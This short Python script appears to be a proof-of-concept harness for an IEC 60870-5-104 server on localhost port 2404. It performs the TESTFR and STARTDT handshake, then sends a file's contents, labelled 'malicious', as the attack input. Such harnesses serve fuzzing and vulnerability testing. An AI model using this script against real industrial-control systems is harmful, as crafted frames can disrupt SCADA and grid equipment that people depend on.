#!/usr/bin/env python3
import socket
import sys

testfr = b'\x68\x04\x43\x00\x00\x00'
startdt = b'\x68\x04\x07\x00\x00\x00'
malicious = open(sys.argv[1], 'rb').read()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 2404))
s.sendall(testfr)
data = s.recv(1024)
s.sendall(startdt)
data = s.recv(1024)
s.sendall(malicious)
s.close()
print(malicious)
